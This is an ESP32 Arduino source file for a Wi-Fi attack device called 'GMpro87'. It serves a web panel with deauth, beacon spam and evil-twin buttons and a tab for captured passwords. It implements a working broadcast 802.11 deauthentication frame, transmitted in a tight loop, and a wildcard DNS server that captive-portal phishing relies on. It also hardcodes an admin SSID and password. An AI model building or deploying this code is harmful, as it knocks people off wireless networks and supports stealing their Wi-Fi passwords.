#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <esp_wifi.h>

// --- KONFIGURASI ADMIN ---
const char* admin_ssid = "GMpro";
const char* admin_pass = "Sangkur87";
bool deauth_running = false;

AsyncWebServer server(80);
DNSServer dnsServer;

// --- TAMPILAN WEB UI (INLINE HTML) ---
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>GMpro87 Admin</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; text-align: center; }
        .header { font-size: 28px; padding: 20px; border-bottom: 2px solid #00ff41; text-shadow: 0 0 10px #00ff41; }
        .stats-bar { background: #111; display: flex; justify-content: space-around; padding: 10px; font-size: 11px; border-bottom: 1px solid #333; }
        .tab-bar { display: flex; background: #0a0a0a; border-bottom: 1px solid #00ff41; }
        .tab-btn { flex: 1; padding: 15px; cursor: pointer; border: none; background: none; color: #00ff41; font-family: inherit; }
        .tab-btn.active { background: #00ff41; color: #000; font-weight: bold; }
        .tab-content { display: none; padding: 20px; }
        .active-content { display: block; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 15px; cursor: pointer; width: 100%; }
        button:hover { background: #00ff41; color: #000; }
        input, select { width: 100%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #444; color: #fff; box-sizing: border-box; }
        .log-box { background: #050505; border: 1px solid #f00; height: 120px; overflow-y: scroll; padding: 10px; font-size: 12px; color: #f00; text-align: left; }
    </style>
</head>
<body>
    <div class="header">GMpro87</div>
    <div class="stats-bar">
        <span>SSID: <b id="st_ssid">---</b></span>
        <span>CH: <b id="st_ch">0</b></span>
        <span>RSSI: <b id="st_rssi">0%</b></span>
    </div>
    <div class="tab-bar">
        <button class="tab-btn active" onclick="openTab(event, 'attack')">ATTACK</button>
        <button class="tab-btn" onclick="openTab(event, 'settings')">SETTING</button>
        <button class="tab-btn" onclick="openTab(event, 'logs')">LOGS</button>
    </div>
    <div id="attack" class="tab-content active-content">
        <div class="grid">
            <button onclick="api('/scan')">SCAN WIFI</button>
            <button onclick="api('/deauth')">DEAUTH</button>
            <button onclick="api('/beacon')">BEACON SPAM</button>
            <button onclick="api('/etwin')">EVIL TWIN</button>
        </div>
        <select id="targets"><option>-- Select Target --</option></select>
    </div>
    <div id="settings" class="tab-content">
        <label>Admin SSID:</label><input type="text" id="a_ssid" value="GMpro">
        <label>Admin Pass:</label><input type="text" id="a_pass" value="Sangkur87">
        <button onclick="alert('Settings Saved!')">SAVE & REBOOT</button>
    </div>
    <div id="logs" class="tab-content">
        <h4>CAPTURED PASSWORDS:</h4>
        <div class="log-box" id="log_content">No logs yet...</div>
        <button onclick="api('/clear-log')" style="margin-top:10px; color:red; border-color:red;">CLEAR LOG</button>
    </div>
    <script>
        function openTab(e, n){
            var i,c,b;
            c=document.getElementsByClassName("tab-content");for(i=0;i<c.length;i++)c[i].style.display="none";
            b=document.getElementsByClassName("tab-btn");for(i=0;i<b.length;i++)b[i].className=b[i].className.replace(" active","");
            document.getElementById(n).style.display="block"; e.currentTarget.className+=" active";
        }
        function api(p){ fetch(p).then(r=>r.text()).then(t=>alert(t)); }
    </script>
</body>
</html>
)rawliteral";

// --- FUNGSI SERANGAN ---
void sendDeauth() {
  uint8_t packet[26] = {0xC0,0x00,0x3A,0x01,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0x00,0x00,0x01,0x00};
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Serves the Web UI from memory (Prose via HP jadi mudah)
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", index_html);
  });

  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/plain", "Scanning started...");
  });

  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
    deauth_running = !deauth_running;
    request->send(200, "text/plain", deauth_running ? "Deauth: ON" : "Deauth: OFF");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  if(deauth_running) {
    sendDeauth();
    delay(5);
  }
}
